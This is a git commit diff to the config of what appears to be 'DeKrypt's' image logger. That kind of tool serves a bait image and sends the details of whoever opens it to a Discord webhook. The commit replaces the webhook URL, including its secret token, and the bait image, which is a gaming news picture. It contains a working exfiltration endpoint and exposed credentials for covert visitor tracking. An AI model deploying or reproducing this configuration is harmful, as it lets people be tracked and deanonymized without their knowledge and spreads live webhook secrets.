c1be02e020b454781f51626e380b96ea02eecd99
traxzontop-rgb <traxzontop@gmail.com>
2026-02-03 00:29:54 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1468115853802213457/b2DHU1PQXSNi-FVL2Lua3FUoSxrLe73DBVA3aO2baLinoLIQr6k71Q8abgJfXPvApdtl",
+    "image": "https://win.gg/wp-content/uploads/news/01259a0cb2431834302abe2df60a1327/44d740e8bc26f3c722589ee1b948f760/original.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
